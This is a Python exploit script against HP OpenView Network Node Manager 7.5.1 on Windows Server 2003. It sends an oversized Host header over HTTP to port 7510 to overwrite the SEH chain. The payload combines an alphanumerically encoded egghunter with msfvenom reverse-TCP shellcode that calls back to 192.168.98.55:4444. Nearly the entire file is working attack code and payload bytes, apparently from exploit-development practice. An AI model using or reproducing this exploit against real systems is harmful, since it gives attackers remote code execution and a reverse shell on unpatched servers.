#!/usr/bin/python

import socket
import os
import sys
## HP OpenView NNM 7.5.1 // Testing on Server 2003 x86
##
##
##
####Egghunter before encoding:####
##	\x66\x81\xCA\xFF	##
##	\x0F\x42\x52\x6A	##
##	\x02\x58\xCD\x2E	##
##	\x3C\x05\x5A\x74	##
##	\xEF\xB8\x54\x30	##
##	\x30\x57\x8B\xFA	##
##	\xAF\x75\xEA\xAF	##
##	\x75\xE7\xFF\xE7	##
##################################
##
############Shell:################ 
##	   msfvenom		## 
##     shell_reverse_tcp 	##
##     LHOST=192.168.98.55 	##
##        LPORT=4444  		##
##     x86/shikata_ga_nai	##
##################################
##
##
##
SHELL=(
"\xba\x02\x05\x09\x42\xdb\xd2\xd9\x74\x24\xf4\x5d\x2b\xc9\xb1"
"\x52\x83\xed\xfc\x31\x55\x0e\x03\x57\x0b\xeb\xb7\xab\xfb\x69"
"\x37\x53\xfc\x0d\xb1\xb6\xcd\x0d\xa5\xb3\x7e\xbe\xad\x91\x72"
"\x35\xe3\x01\x00\x3b\x2c\x26\xa1\xf6\x0a\x09\x32\xaa\x6f\x08"
"\xb0\xb1\xa3\xea\x89\x79\xb6\xeb\xce\x64\x3b\xb9\x87\xe3\xee"
"\x2d\xa3\xbe\x32\xc6\xff\x2f\x33\x3b\xb7\x4e\x12\xea\xc3\x08"
"\xb4\x0d\x07\x21\xfd\x15\x44\x0c\xb7\xae\xbe\xfa\x46\x66\x8f"
"\x03\xe4\x47\x3f\xf6\xf4\x80\xf8\xe9\x82\xf8\xfa\x94\x94\x3f"
"\x80\x42\x10\xdb\x22\x00\x82\x07\xd2\xc5\x55\xcc\xd8\xa2\x12"
"\x8a\xfc\x35\xf6\xa1\xf9\xbe\xf9\x65\x88\x85\xdd\xa1\xd0\x5e"
"\x7f\xf0\xbc\x31\x80\xe2\x1e\xed\x24\x69\xb2\xfa\x54\x30\xdb"
"\xcf\x54\xca\x1b\x58\xee\xb9\x29\xc7\x44\x55\x02\x80\x42\xa2"
"\x65\xbb\x33\x3c\x98\x44\x44\x15\x5f\x10\x14\x0d\x76\x19\xff"
"\xcd\x77\xcc\x50\x9d\xd7\xbf\x10\x4d\x98\x6f\xf9\x87\x17\x4f"
"\x19\xa8\xfd\xf8\xb0\x53\x96\xc6\xed\x39\x51\xaf\xef\xbd\x8c"
"\x73\x79\x5b\xc4\x9b\x2f\xf4\x71\x05\x6a\x8e\xe0\xca\xa0\xeb"
"\x23\x40\x47\x0c\xed\xa1\x22\x1e\x9a\x41\x79\x7c\x0d\x5d\x57"
"\xe8\xd1\xcc\x3c\xe8\x9c\xec\xea\xbf\xc9\xc3\xe2\x55\xe4\x7a"
"\x5d\x4b\xf5\x1b\xa6\xcf\x22\xd8\x29\xce\xa7\x64\x0e\xc0\x71"
"\x64\x0a\xb4\x2d\x33\xc4\x62\x88\xed\xa6\xdc\x42\x41\x61\x88"
"\x13\xa9\xb2\xce\x1b\xe4\x44\x2e\xad\x51\x11\x51\x02\x36\x95"
"\x2a\x7e\xa6\x5a\xe1\x3a\xd6\x10\xab\x6b\x7f\xfd\x3e\x2e\xe2"
"\xfe\x95\x6d\x1b\x7d\x1f\x0e\xd8\x9d\x6a\x0b\xa4\x19\x87\x61"
"\xb5\xcf\xa7\xd6\xb6\xc5" + "\xcc" * 500)

EGGHUNTER=(
	"\x25\x4A\x4D\x4E\x55"	#ZERO OUT EAX
	"\x25\x35\x32\x31\x2A"	#ZERO OUT EAX
	"\x54\x58"		#PUSH ESP, POP EAX
        "\x25\x4A\x4D\x4E\x55"  #ZERO OUT EAX
        "\x25\x35\x32\x31\x2A"  #ZERO OUT EAX
	"\x2D\x20\x60\x66\x66"	#SUB TO SPAWN EGG (CHANGE)
	"\x2D\x30\x50\x41\x55"	#SUB TO SPAWN EGG (CHANGE)
	"\x2D\x30\x50\x22\x34"	#SUB TO SPAWN EGG (CHANGE)
	"\x50\x5C"		#PUSH EAX, POP ESP
        "\x25\x4A\x4D\x4E\x55"  #ZERO OUT EAX
        "\x25\x35\x32\x31\x2A"  #ZERO OUT EAX
	"\x2D\x26\x12\x66\x02"	#0xE7FFE775
	"\x2D\x22\x02\x22\x02"	#0xE7FFE775
	"\x2D\x43\x04\x78\x13"	#0xE7FFE775
	"\x50"			#PUSH EAX
	"\x25\x4A\x4D\x4E\x55"	#ZERO OUT EAX
	"\x25\x35\x32\x31\x2A"	#ZERO OUT EAX
	"\x2D\x21\x22\x62\x16"	#0xAFEA75AF
	"\x2D\x10\x22\x51\x15"	#0xAFEA75AF
	"\x2D\x20\x46\x62\x24"	#0xAFEA75AF
	"\x50"			#PUSH EAX
	"\x25\x4A\x4D\x4E\x55"	#ZERO OUT EAX
	"\x25\x35\x32\x31\x2A"	#ZERO OUT EAX
	"\x2D\x50\x64\x31\x02"	#0xFA8B5730
	"\x2D\x50\x22\x22\x02"	#0xFA8B5730
	"\x2D\x30\x22\x21\x01"	#0xFA8B5730
	"\x50"			#PUSH EAX
	"\x25\x4A\x4D\x4E\x55"	#ZERO OUT EAX
	"\x25\x35\x32\x31\x2A"	#ZERO OUT EAX
	"\x2D\x06\x14\x66\x66"	#0x3054B8EF
	"\x2D\x06\x22\x22\x45"	#0x3054B8EF
	"\x2D\x05\x11\x23\x24"	#0x3054B8EF
	"\x50"			#PUSH EAX
	"\x25\x4A\x4D\x4E\x55"	#ZERO OUT EAX
	"\x25\x35\x32\x31\x2A"	#ZERO OUT EAX
	"\x2D\x61\x66\x62\x26"	#0x745a053C
	"\x2D\x32\x62\x22\x44"	#0x745a053C
	"\x2D\x31\x32\x21\x21"	#0x745a053C
	"\x50"			#PUSH EAX
	"\x25\x4A\x4D\x4E\x55"	#ZERO OUT EAX
	"\x25\x35\x32\x31\x2A"	#ZERO OUT EAX
	"\x2D\x66\x64\x10\x60"	#0x2ECD5802
	"\x2D\x44\x32\x11\x60"	#0x2ECD5802
	"\x2D\x54\x11\x11\x11"	#0x2ECD5802
	"\x50"			#PUSH EAX
	"\x25\x4A\x4D\x4E\x55"	#ZERO OUT EAX
	"\x25\x35\x32\x31\x2A"	#ZERO OUT EAX
	"\x2D\x50\x66\x66\x52"	#0x6A52420F
	"\x2D\x50\x23\x23\x32"	#0x6A52420F
	"\x2D\x51\x34\x24\x11"	#0x6A52420F
	"\x50"			#PUSH EAX
	"\x25\x4A\x4D\x4E\x55"	#ZERO OUT EAX
	"\x25\x35\x32\x31\x2A"	#ZERO OUT EAX
	"\x2D\x46\x46\x12\x55"	#0xFFCA8166
	"\x2D\x32\x26\x12\x66"	#0xFFCA8166
	"\x2D\x22\x12\x11\x45"	#0xFFCA8166
	"\x50"			#PUSH EAX
)

SEH="\x1E\x09\x35\x6D" # POP, POP, RET jvm.dll
NSEH="\x77\x21" # INC ESP, INC ESP, JA 21
#ALIGN="\xEB\x03\x59\xEB\x05\xE8\xF8\xFF\xFF\xFF\x4F"
EGG="T00WT00W"

CRASH = "\x4C" * 3379 + NSEH  + SEH  + "C" * 32 + EGGHUNTER  + "C" * 100 + " :7510"

buffer="GET /topology/homeBaseView HTTP/1.1\r\n"
buffer+="Host: " + CRASH + "\r\n"
buffer+="Content-Type: application/x-www-form-urlencoded\r\n"
buffer+="User-Agent: " + "\x4C" * 700 + "\r\n"
buffer+="Content-Length: 1048580\r\n\r\n"
buffer+=EGG + SHELL

print "[*]Buffer Sent[*]"

expl = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
expl.connect(("192.168.99.172",7510))
expl.send(buffer)
expl.close()
